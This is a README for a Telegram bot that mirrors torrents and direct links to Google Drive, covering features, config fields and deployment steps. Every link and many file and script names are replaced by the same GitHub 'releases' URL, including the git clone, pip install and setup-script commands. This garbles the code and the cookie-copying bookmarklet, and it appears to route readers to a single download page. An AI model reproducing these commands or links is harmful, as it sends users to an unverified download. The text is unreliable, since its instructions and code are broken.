This is a Telegram Bot written in Python for mirroring files on the Internet to your Google Drive or Telegram. Based on [python-aria-mirror-bot](https://github.com/reezqi41/mirror-leech-telegram-bot/releases)

# Features:

## By [Anas](https://github.com/reezqi41/mirror-leech-telegram-bot/releases)
- qBittorrent
- Select files from Torrent before downloading using qbittorrent
- Leech (splitting, thumbnail for each user, setting as document or as media for each user)
- Size limiting for Torrent/Direct, Zip/Unzip, Mega and Clone
- Stop duplicates for all tasks except yt-dlp tasks
- Zip/Unzip G-Drive links
- Counting files/folders from Google Drive link
- View Link button, extra button to open file index link in broswer instead of direct download
- Status Pages for unlimited tasks
- Clone status
- Search in multiple Drive folder/TeamDrive
- Recursive Search (only with `root` or TeamDrive ID, folder ids will be listed with non-recursive method)
- Multi-Search by https://github.com/reezqi41/mirror-leech-telegram-bot/releases if exists
- Extract rar, zip and 7z splits with or without password
- Zip file/folder with or without password
- Use https://github.com/reezqi41/mirror-leech-telegram-bot/releases if file not found with Service Account for all Gdrive functions
- Random Service Account at startup
- Mirror/Leech/Watch/Clone/Count/Del by reply
- YT-DLP quality buttons
- Search for torrents with Torrent Search API or with variable plugins using qBittorrent search engine
- Docker image support for `linux/amd64, linux/arm64, linux/arm/v7, linux/arm/v6` (**Note**: Use `anasty17/mltb-oracle:latest` for oracle or if u faced problem with arm64 docker run)
- Update bot at startup and with restart command using `UPSTREAM_REPO`
- Clone/Zip/Unzip/Count from gdtot links (main script from [Yusuf](https://github.com/reezqi41/mirror-leech-telegram-bot/releases)) and delete first cloned file from main drive or TeamDrive
- Qbittorrent seed until reaching specific ratio or time
- Many bugs have been fixed

## From Other Repositories
- Mirror direct download links, Torrent, and Telegram files to Google Drive
- Mirror https://github.com/reezqi41/mirror-leech-telegram-bot/releases links to Google Drive (If you have non-premium Mega account, it will limit download to 5GB per 6 hours)
- Copy files from someone's Drive to your Drive (Using Autorclone)
- Download/Upload progress, Speeds and ETAs
- Mirror all yt-dlp supported links
- Docker support
- Uploading to Team Drive
- Index Link support
- Service Account support
- Delete files from Drive
- Shortener support
- Speedtest
- Multiple Trackers support
- Shell and Executor
- Sudo with or without Database
- Custom Filename* (Only for direct links, Telegram files and yt-dlp. Not for Mega links, Gdrive links or Torrents)
- Extract or Compress password protected files.
- Extract these filetypes and uploads to Google Drive
  > ZIP, RAR, TAR, 7z, ISO, WIM, CAB, GZIP, BZIP2, APM, ARJ, CHM, CPIO, CramFS, DEB, DMG, FAT, HFS, LZH, LZMA, LZMA2, MBR, MSI, MSLZ, NSIS, NTFS, RPM, SquashFS, UDF, VHD, XAR, Z, https://github.com/reezqi41/mirror-leech-telegram-bot/releases

- Direct links Supported:
  >https://github.com/reezqi41/mirror-leech-telegram-bot/releases, https://github.com/reezqi41/mirror-leech-telegram-bot/releases, https://github.com/reezqi41/mirror-leech-telegram-bot/releases, https://github.com/reezqi41/mirror-leech-telegram-bot/releases, antfiles, https://github.com/reezqi41/mirror-leech-telegram-bot/releases, https://github.com/reezqi41/mirror-leech-telegram-bot/releases, https://github.com/reezqi41/mirror-leech-telegram-bot/releases, https://github.com/reezqi41/mirror-leech-telegram-bot/releases, https://github.com/reezqi41/mirror-leech-telegram-bot/releases, https://github.com/reezqi41/mirror-leech-telegram-bot/releases, https://github.com/reezqi41/mirror-leech-telegram-bot/releases, https://github.com/reezqi41/mirror-leech-telegram-bot/releases, https://github.com/reezqi41/mirror-leech-telegram-bot/releases, https://github.com/reezqi41/mirror-leech-telegram-bot/releases, https://github.com/reezqi41/mirror-leech-telegram-bot/releases, https://github.com/reezqi41/mirror-leech-telegram-bot/releases, https://github.com/reezqi41/mirror-leech-telegram-bot/releases, https://github.com/reezqi41/mirror-leech-telegram-bot/releases, https://github.com/reezqi41/mirror-leech-telegram-bot/releases, https://github.com/reezqi41/mirror-leech-telegram-bot/releases, https://github.com/reezqi41/mirror-leech-telegram-bot/releases (Only works for file not folder or business account), https://github.com/reezqi41/mirror-leech-telegram-bot/releases (Uptobox account must be premium), https://github.com/reezqi41/mirror-leech-telegram-bot/releases

# How to deploy?

## Prerequisites

- Tutorial Video from A to Z:
  - Thanks to [Wiszky](https://github.com/reezqi41/mirror-leech-telegram-bot/releases)
<p><a href="https://github.com/reezqi41/mirror-leech-telegram-bot/releases"> <img src="https://github.com/reezqi41/mirror-leech-telegram-bot/releases%20Video-black?style=for-the-badge&logo=YouTube" width="160""/></a></p>

### 1. Installing requirements

- Clone this repo:
```
git clone https://github.com/reezqi41/mirror-leech-telegram-bot/releases mirrorbot/ && cd mirrorbot
```
- For Debian based distros
```
sudo apt install python3
```
Install Docker by following the [official Docker docs](https://github.com/reezqi41/mirror-leech-telegram-bot/releases) or by commands below.
```
sudo apt install snapd
sudo snap install docker
```
- For Arch and it's derivatives:
```
sudo pacman -S docker python
```
- Install dependencies for running setup scripts:
```
pip3 install -r https://github.com/reezqi41/mirror-leech-telegram-bot/releases
```

------

### 2. Setting up config file

```
cp https://github.com/reezqi41/mirror-leech-telegram-bot/releases https://github.com/reezqi41/mirror-leech-telegram-bot/releases
```
- Remove the first line saying:
```
_____REMOVE_THIS_LINE_____=True
```
Fill up rest of the fields. Meaning of each field is discussed below:

**1. Required Fields**
<details>
    <summary><b>Click Here For More Details</b></summary>

- `BOT_TOKEN`: The Telegram Bot Token that you got from [@BotFather](https://github.com/reezqi41/mirror-leech-telegram-bot/releases)
- `TELEGRAM_API`: This is to authenticate your Telegram account for downloading Telegram files. You can get this from https://github.com/reezqi41/mirror-leech-telegram-bot/releases **NOTE**: DO NOT put this in quotes.
- `TELEGRAM_HASH`: This is to authenticate your Telegram account for downloading Telegram files. You can get this from https://github.com/reezqi41/mirror-leech-telegram-bot/releases
- `OWNER_ID`: The Telegram User ID (not username) of the Owner of the bot
- `GDRIVE_FOLDER_ID`: This is the Folder/TeamDrive ID of the Google Drive Folder to which you want to upload all the mirrors.
- `DOWNLOAD_DIR`: The path to the local folder where the downloads should be downloaded to
- `DOWNLOAD_STATUS_UPDATE_INTERVAL`: A short interval of time in seconds after which the Mirror progress/status message is updated. (I recommend to keep it to `10` seconds at least)
- `AUTO_DELETE_MESSAGE_DURATION`: Interval of time (in seconds), after which the bot deletes it's message (and command message) which is expected to be viewed instantly. (**NOTE**: Set to `-1` to disable auto message deletion)
- `BASE_URL_OF_BOT`: Valid BASE URL where the bot is deployed to use qbittorrent web selection. Format of URL should be `http://myip`, where `myip` is the IP/Domain(public) of your bot or if you have chosen port other than `80` so write it in this format `http://myip:port` (`http` and not `https`). This Var is optional on VPS and required for Heroku specially to avoid app sleeping/idling. For Heroku fill `https://github.com/reezqi41/mirror-leech-telegram-bot/releases`. Still got idling? You can use https://github.com/reezqi41/mirror-leech-telegram-bot/releases to ping your Heroku app. (**NOTE**: Don't add slash at the end).
</details>

**2. Optional Fields**

<details>
    <summary><b>Click Here For More Details</b></summary>

- `ACCOUNTS_ZIP_URL`: Only if you want to load your Service Account externally from an Index Link or by any direct download link NOT webpage link. Archive the accounts folder to a zip file. Fill this with the direct download link of that file. If index need authentication so add direct download as shown below:
  - `https://github.com/reezqi41/mirror-leech-telegram-bot/releases`
- `TOKEN_PICKLE_URL`: Only if you want to load your **https://github.com/reezqi41/mirror-leech-telegram-bot/releases** externally from an Index Link. Fill this with the direct link of that file.
- `MULTI_SEARCH_URL`: Check `drive_folder` setup [here](https://github.com/reezqi41/mirror-leech-telegram-bot/releases). Write **drive_folder** file [here](https://github.com/reezqi41/mirror-leech-telegram-bot/releases). Open the raw file of that gist, it's URL will be your required variable. Should be in this form after removing commit id: https://github.com/reezqi41/mirror-leech-telegram-bot/releases
- `YT_COOKIES_URL`: Youtube authentication cookies. Check setup [Here](https://github.com/reezqi41/mirror-leech-telegram-bot/releases). Use gist raw link and remove commit id from the link, so you can edit it from gists only.
- `NETRC_URL`: To create .netrc file contains authentication for aria2c and yt-dlp. Use gist raw link and remove commit id from the link, so you can edit it from gists only. **NOTE**: After editing .nterc you need to restart the docker or if deployed on heroku so restart dyno in case your edits related to aria2c authentication.
  - **NOTE**: All above url variables used incase you want edit them in future easily without deploying again or if you want to deploy from public fork. If deploying using cli or private fork you can leave these variables empty add https://github.com/reezqi41/mirror-leech-telegram-bot/releases, accounts folder, drive_folder, .netrc and https://github.com/reezqi41/mirror-leech-telegram-bot/releases directly to root but you can't update them without rebuild OR simply leave all above variables and use private UPSTREAM_REPO.
- `DATABASE_URL`: (NOT RECOMMENDED FOR NOW) Your Database URL. See [Generate Database](https://github.com/reezqi41/mirror-leech-telegram-bot/releases) to generate database (**NOTE**: If you use database you can save your Sudo ID permanently).
- `AUTHORIZED_CHATS`: Fill user_id and chat_id (not username) of groups/users you want to authorize. Separate them with space, Examples: `-0123456789 -1122334455 6915401739`.
- `SUDO_USERS`: Fill user_id (not username) of users whom you want to give sudo permission. Separate them with space, Examples: `0123456789 1122334455 6915401739` (**NOTE**: If you want to save Sudo ID permanently without database, you must fill your Sudo Id here).
- `IS_TEAM_DRIVE`: Set to `False` or leave it empty to get public google drive links else `True` so only who have access to your Folder/TeamDrive can open the links. `Bool`
- `USE_SERVICE_ACCOUNTS`: (Leave empty if unsure) Whether to use Service Accounts or not. For this to work see [Using Service Accounts](https://github.com/reezqi41/mirror-leech-telegram-bot/releases) section below.
- `INDEX_URL`: Refer to https://github.com/reezqi41/mirror-leech-telegram-bot/releases The URL should not have any trailing '/' at the end.
- `MEGA_API_KEY`: https://github.com/reezqi41/mirror-leech-telegram-bot/releases API key to mirror https://github.com/reezqi41/mirror-leech-telegram-bot/releases links. Get it from [Mega SDK Page](https://github.com/reezqi41/mirror-leech-telegram-bot/releases)
- `MEGA_EMAIL_ID`: E-Mail ID used to sign up on https://github.com/reezqi41/mirror-leech-telegram-bot/releases for using premium account (Leave though)
- `MEGA_PASSWORD`: Password for https://github.com/reezqi41/mirror-leech-telegram-bot/releases account
- `BLOCK_MEGA_FOLDER`: If you want to remove https://github.com/reezqi41/mirror-leech-telegram-bot/releases folder support, set it to `True`. `Bool`
- `BLOCK_MEGA_LINKS`: If you want to remove https://github.com/reezqi41/mirror-leech-telegram-bot/releases mirror support, set it to `True`. `Bool`
- `STOP_DUPLICATE`: (Leave empty if unsure) if this field is set to `True`, bot will check file in Drive, if it is present in Drive, downloading or cloning will be stopped. (**NOTE**: File will be checked using filename not file hash, so this feature is not perfect yet). `Bool`
- `CLONE_LIMIT`: To limit the size of Google Drive folder/file which you can clone. Don't add unit, the default unit is `GB`.
- `MEGA_LIMIT`: To limit the size of Mega download. Don't add unit, the default unit is `GB`.
- `TORRENT_DIRECT_LIMIT`: To limit the Torrent/Direct mirror size. Don't add unit, the default unit is `GB`.
- `ZIP_UNZIP_LIMIT`: To limit the size of zip and unzip commands. Don't add unit, the default unit is `GB`.
- `VIEW_LINK`: View Link button to open file Index Link in browser instead of direct download link, you can figure out if it's compatible with your Index code or not, open any video from you Index and check if its URL ends with `?a=view`, if yes make it `True`, compatible with [BhadooIndex](https://github.com/reezqi41/mirror-leech-telegram-bot/releases) Code. `Bool`
- `UPTOBOX_TOKEN`: Uptobox token to mirror uptobox links. Get it from [Uptobox Premium Account](https://github.com/reezqi41/mirror-leech-telegram-bot/releases).
- `IGNORE_PENDING_REQUESTS`: If you want the bot to ignore pending requests after it restarts, set this to `True`. `Bool`
- `STATUS_LIMIT`: Limit the no. of tasks shown in status message with buttons. **NOTE**: Recommended limit is `4` tasks.
- `IS_VPS`: (Only for VPS) Don't set this to `True` even if you are using VPS, unless facing error with web server. `Bool`
- `SERVER_PORT`: Only For VPS even if `IS_VPS` is `False`, which is the **BASE_URL_OF_BOT** Port.
- `WEB_PINCODE`: If empty or `False` means no more pincode required while qbit web selection. `Bool`
- `QB_SEED`: If `True` qbit torrent will be seeded after and while uploading until reaching specific ratio or time, edit `MaxRatio` or `GlobalMaxSeedingMinutes` or both from https://github.com/reezqi41/mirror-leech-telegram-bot/releases (`-1` means no limit, but u can cancel manually by gid). **NOTE**: Don't change `MaxRatioAction`. `Bool`
  - **Qbittorrent Note**: To auto cancel dead torrents after specific time, edit these two numbers (999999) in seconds. [1st](https://github.com/reezqi41/mirror-leech-telegram-bot/releases) for metadata download timeout and [2nd](https://github.com/reezqi41/mirror-leech-telegram-bot/releases) for stalled downlaod timeout.
- `TG_SPLIT_SIZE`: Size of split in bytes, leave it empty for max size `2GB`.
- `AS_DOCUMENT`: Default Telegram file type upload. Empty or `False` means as media. `Bool`
- `EQUAL_SPLITS`: Split files larger than **TG_SPLIT_SIZE** into equal parts size (Not working with zip cmd). `Bool`
- `CUSTOM_FILENAME`: Add custom word to leeched file name.
- `UPSTREAM_REPO`: Your github repository link, if your repo is private add `https://{githubtoken}https://github.com/reezqi41/mirror-leech-telegram-bot/releases{username}/{reponame}` format. Get token from [Github settings](https://github.com/reezqi41/mirror-leech-telegram-bot/releases). So you can update your appllication from filled repository on each restart. **NOTE**: Any change in docker or requirements you need to deploy/build again with updated repo to take effect - DON'T delete .gitignore file.
- `SHORTENER_API`: Fill your Shortener API key.
- `SHORTENER`: Shortener URL.
  - Supported URL Shorteners:
  >https://github.com/reezqi41/mirror-leech-telegram-bot/releases, https://github.com/reezqi41/mirror-leech-telegram-bot/releases, https://github.com/reezqi41/mirror-leech-telegram-bot/releases, https://github.com/reezqi41/mirror-leech-telegram-bot/releases, https://github.com/reezqi41/mirror-leech-telegram-bot/releases, https://github.com/reezqi41/mirror-leech-telegram-bot/releases, https://github.com/reezqi41/mirror-leech-telegram-bot/releases, https://github.com/reezqi41/mirror-leech-telegram-bot/releases , https://github.com/reezqi41/mirror-leech-telegram-bot/releases
- `SEARCH_API_LINK`: Search api app link. Get your api from deploying this [repository](https://github.com/reezqi41/mirror-leech-telegram-bot/releases). **Note**: Don't add slash at the end.
  - Supported Sites:
  >rarbg, 1337x, yts, etzv, tgx, torlock, piratebay, nyaasi, ettv
- `PHPSESSID` and `CRYPT`: Cookies for gdtot google drive link generator. Follow these [steps](https://github.com/reezqi41/mirror-leech-telegram-bot/releases).
- `SEARCH_PLUGINS`: List of qBittorrent search plugins (github raw links). I have added some plugins, you can remove/add plugins as you want. Main Source: [qBittorrent Search Plugins (Official/Unofficial)](https://github.com/reezqi41/mirror-leech-telegram-bot/releases).

Three buttons are already added including Drive Link, Index Link, and View Link, you can add extra buttons, if you don't know what are the below entries, simply leave them empty.
- `BUTTON_FOUR_NAME`:
- `BUTTON_FOUR_URL`:
- `BUTTON_FIVE_NAME`:
- `BUTTON_FIVE_URL`:
- `BUTTON_SIX_NAME`:
- `BUTTON_SIX_URL`:

</details>

------

### 3. Getting Google OAuth API credential file and https://github.com/reezqi41/mirror-leech-telegram-bot/releases
- Visit the [Google Cloud Console](https://github.com/reezqi41/mirror-leech-telegram-bot/releases)
- Go to the OAuth Consent tab, fill it, and save.
- Go to the Credentials tab and click Create Credentials -> OAuth Client ID
- Choose Desktop and Create.
- Publish your OAuth consent screen App to prevent **https://github.com/reezqi41/mirror-leech-telegram-bot/releases** from expire
- Use the download button to download your credentials.
- Move that file to the root of mirrorbot, and rename it to **https://github.com/reezqi41/mirror-leech-telegram-bot/releases**
- Visit [Google API page](https://github.com/reezqi41/mirror-leech-telegram-bot/releases)
- Search for Drive and enable it if it is disabled
- Finally, run the script to generate **https://github.com/reezqi41/mirror-leech-telegram-bot/releases** file for Google Drive:
```
pip install google-api-python-client google-auth-httplib2 google-auth-oauthlib
python3 https://github.com/reezqi41/mirror-leech-telegram-bot/releases
```
------

## Deploying on VPS

**IMPORTANT NOTES**:
1. You must set `SERVER_PORT` variable to `80` or any other port you want to use.
2. To clear the container (this will not affect on the image):
```
sudo docker container prune
```
3. To delete the images:
```
sudo docker image prune -a
```
4. Use `anasty17/mltb-oracle:latest` for oracle or if u faced problem with arm64 docker run.
   - Tutorial Video for Deploying on Oracle VPS:
     - Thanks to [Wiszky](https://github.com/reezqi41/mirror-leech-telegram-bot/releases)
     - No need to use sudo su, you can also use sudo before each cmd!
<p><a href="https://github.com/reezqi41/mirror-leech-telegram-bot/releases"> <img src="https://github.com/reezqi41/mirror-leech-telegram-bot/releases%20Video-black?style=for-the-badge&logo=YouTube" width="160""/></a></p>

------

### Deploying on VPS Using Docker

- Start Docker daemon (skip if already running):
```
sudo dockerd
```
- **Note**: If not started or not starting, run the command below then try to start.
```
sudo apt install https://github.com/reezqi41/mirror-leech-telegram-bot/releases
```
- Build Docker image:
```
sudo docker build . -t mirror-bot
```
- Run the image:
```
sudo docker run -p 80:80 mirror-bot
```
- To stop the image:
```
sudo docker ps
```
```
sudo docker stop id
```

----

### Deploying on VPS Using docker-compose

**NOTE**: If you want to use port other than 80, change it in [https://github.com/reezqi41/mirror-leech-telegram-bot/releases](https://github.com/reezqi41/mirror-leech-telegram-bot/releases) also.

```
sudo apt install docker-compose
```
- Build and run Docker image:
```
sudo docker-compose up
```
- After editing files with nano for example (nano https://github.com/reezqi41/mirror-leech-telegram-bot/releases):
```
sudo docker-compose up --build
```
- or
```
sudo docker-compose build
sudo docker-compose up
```
- To stop the image:
```
sudo docker-compose stop
```
- To run the image:
```
sudo docker-compose start
```
- Tutorial video from Tortoolkit repo for docker-compose and checking ports
<p><a href="https://github.com/reezqi41/mirror-leech-telegram-bot/releases"> <img src="https://github.com/reezqi41/mirror-leech-telegram-bot/releases%20Video-black?style=for-the-badge&logo=YouTube" width="160""/></a></p>

------

## Deploying on Heroku
<p><a href="https://github.com/reezqi41/mirror-leech-telegram-bot/releases"> <img src="https://github.com/reezqi41/mirror-leech-telegram-bot/releases%20Guide-blueviolet?style=for-the-badge&logo=heroku" width="170""/></a></p>

------

# Extras

## Bot commands to be set in [@BotFather](https://github.com/reezqi41/mirror-leech-telegram-bot/releases)

```
mirror - Mirror
zipmirror - Mirror and upload as zip
unzipmirror - Mirror and extract files
qbmirror - Mirror torrent using qBittorrent
qbzipmirror - Mirror torrent and upload as zip using qb
qbunzipmirror - Mirror torrent and extract files using qb
leech - Leech
zipleech - Leech and upload as zip
unzipleech - Leech and extract files
qbleech - Leech torrent using qBittorrent
qbzipleech - Leech torrent and upload as zip using qb
qbunzipleech - Leech torrent and extract using qb
clone - Copy file/folder to Drive
count - Count file/folder of Drive
watch - Mirror yt-dlp supported link
zipwatch - Mirror yt-dlp supported link as zip
leechwatch - Leech through yt-dlp supported link
leechzipwatch - Leech yt-dlp support link as zip
leechset - Leech settings
setthumb - Set thumbnail
status - Get Mirror Status message
list - Search files in Drive
search - Search for torrents with API
cancel - Cancel a task
cancelall - Cancel all tasks
del - Delete file/folder from Drive
log - Get the Bot Log
shell - Run commands in Shell
restart - Restart the Bot
stats - Bot Usage Stats
ping - Ping the Bot
help - All cmds with description
```
------

## Using Service Accounts for uploading to avoid user rate limit
>For Service Account to work, you must set `USE_SERVICE_ACCOUNTS` = "True" in config file or environment variables.
>**NOTE**: Using Service Accounts is only recommended while uploading to a Team Drive.

### 1. Generate Service Accounts. [What is Service Account?](https://github.com/reezqi41/mirror-leech-telegram-bot/releases)
Let us create only the Service Accounts that we need.

**Warning**: Abuse of this feature is not the aim of this project and we do **NOT** recommend that you make a lot of projects, just one project and 100 SAs allow you plenty of use, its also possible that over abuse might get your projects banned by Google.

>**NOTE**: If you have created SAs in past from this script, you can also just re download the keys by running:
```
python3 https://github.com/reezqi41/mirror-leech-telegram-bot/releases --download-keys project_id
```
>**NOTE:** 1 Service Account can upload/copy around 750 GB a day, 1 project can make 100 Service Accounts so you can upload 75 TB a day or clone 2 TB from each file creator (uploader email).

#### Two methods to create service accounts
Choose one of these methods

##### 1. Create Service Accounts in existed Project (Recommended Method)
- List your projects ids
```
python3 https://github.com/reezqi41/mirror-leech-telegram-bot/releases --list-projects
```
- Enable services automatically by this command
```
python3 https://github.com/reezqi41/mirror-leech-telegram-bot/releases --enable-services $PROJECTID
```
- Create Sevice Accounts to current project
```
python3 https://github.com/reezqi41/mirror-leech-telegram-bot/releases --create-sas $PROJECTID
```
- Download Sevice Accounts as accounts folder
```
python3 https://github.com/reezqi41/mirror-leech-telegram-bot/releases --download-keys $PROJECTID
```

##### 2. Create Service Accounts in New Project
```
python3 https://github.com/reezqi41/mirror-leech-telegram-bot/releases --quick-setup 1 --new-only
```
A folder named accounts will be created which will contain keys for the Service Accounts.

### 2. Add Service Accounts

#### Two methods to add service accounts
Choose one of these methods

##### 1. Add Them To Google Group then to Team Drive (Recommended)
- Mount accounts folder
```
cd accounts
```
- Grab emails form all accounts to https://github.com/reezqi41/mirror-leech-telegram-bot/releases file that would be created in accounts folder
- `For Windows using PowerShell`
```
$emails = Get-ChildItem .\**.json |Get-Content -Raw |ConvertFrom-Json |Select -ExpandProperty client_email >>https://github.com/reezqi41/mirror-leech-telegram-bot/releases
```
- `For Linux / MacOs`
```
grep -oPh '"client_email": "\K[^"]+' *.json > https://github.com/reezqi41/mirror-leech-telegram-bot/releases
```
- Unmount acounts folder
```
cd ..
```
Then add emails from https://github.com/reezqi41/mirror-leech-telegram-bot/releases to Google Group, after that add this Google Group to your Shared Drive and promote it to manager and delete https://github.com/reezqi41/mirror-leech-telegram-bot/releases file from accounts folder

##### 2. Add Them To Team Drive Directly
- Run:
```
python3 https://github.com/reezqi41/mirror-leech-telegram-bot/releases -d SharedTeamDriveSrcID
```
------

### Generate Database

**1. Using ElephantSQL**
- Go to https://github.com/reezqi41/mirror-leech-telegram-bot/releases and create account (skip this if you already have **ElephantSQL** account)
- Hit `Create New Instance`
- Follow the further instructions in the screen
- Hit `Select Region`
- Hit `Review`
- Hit `Create instance`
- Select your database name
- Copy your database url, and fill to `DATABASE_URL` in config

**2. Using Heroku PostgreSQL**
<p><a href="https://github.com/reezqi41/mirror-leech-telegram-bot/releases"> <img src="https://github.com/reezqi41/mirror-leech-telegram-bot/releases%https://github.com/reezqi41/mirror-leech-telegram-bot/releases" width="160""/></a></p>

------

## Multi Search IDs
To use list from multi TD/folder. Run https://github.com/reezqi41/mirror-leech-telegram-bot/releases in your terminal and follow it. It will generate **drive_folder** file or u can simply create `drive_folder` file in working directory and fill it, check below format:
```
MyTdName folderID/tdID IndexLink(if available)
MyTdName2 folderID/tdID IndexLink(if available)
```
-----

## Yt-dlp and Aria2c Authentication Using .netrc File
For using your premium accounts in yt-dlp or for protected Index Links, create .netrc file according to following format:

**Note**: Create .netrc and not netrc, this file will be hidden, so view hidden files to edit it after creation.

Format:
```
machine host login username password my_password
```
Example:
```
machine instagram login https://github.com/reezqi41/mirror-leech-telegram-bot/releases password mypassword
```
**Instagram Note**: You must login even if you want to download public posts and after first try you must confirm that this was you logged in from different ip(you can confirm from phone app).

**Youtube Note**: For `youtube` authentication use [https://github.com/reezqi41/mirror-leech-telegram-bot/releases](https://github.com/reezqi41/mirror-leech-telegram-bot/releases) file.

For Index Link with only password without username, even http auth will not work, so this is the solution.
```
machine https://github.com/reezqi41/mirror-leech-telegram-bot/releases password index_password
```
Where host is the name of extractor (eg. instagram, Twitch). Multiple accounts of different hosts can be added each separated by a new line.

-----

## Gdtot Cookies
To Clone or Leech gdtot link follow these steps:
1. Login/Register to [gdtot](https://github.com/reezqi41/mirror-leech-telegram-bot/releases).
2. Copy this script and paste it in browser address bar.
   - **Note**: After pasting it check at the beginning of the script in broswer address bar if `javascript:` exists or not, if not so write it as shown below.
   ```
   javascript:(function () {
     const input = https://github.com/reezqi41/mirror-leech-telegram-bot/releases('input');
     https://github.com/reezqi41/mirror-leech-telegram-bot/releases = https://github.com/reezqi41/mirror-leech-telegram-bot/releases({url : https://github.com/reezqi41/mirror-leech-telegram-bot/releases, cookie : https://github.com/reezqi41/mirror-leech-telegram-bot/releases});
     https://github.com/reezqi41/mirror-leech-telegram-bot/releases(input);
     https://github.com/reezqi41/mirror-leech-telegram-bot/releases();
     https://github.com/reezqi41/mirror-leech-telegram-bot/releases();
     var result = https://github.com/reezqi41/mirror-leech-telegram-bot/releases('copy');
     https://github.com/reezqi41/mirror-leech-telegram-bot/releases(input);
     if(result)
       alert('Cookie copied to clipboard');
     else
       prompt('Failed to copy cookie. Manually copy below cookie\n\n', https://github.com/reezqi41/mirror-leech-telegram-bot/releases);
   })();
   ```
   - After pressing enter your browser will prompt a alert.
3. Now you'll get this type of data in your clipboard
   ```
   {"url":"https://github.com/reezqi41/mirror-leech-telegram-bot/releases","cookie":"PHPSESSID=k2xxxxxxxxxxxxxxxxxxxxj63o; crypt=NGxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxWdSVT0%3D"}

   ```
4. From this you have to paste value of PHPSESSID and crypt in https://github.com/reezqi41/mirror-leech-telegram-bot/releases file.

-----
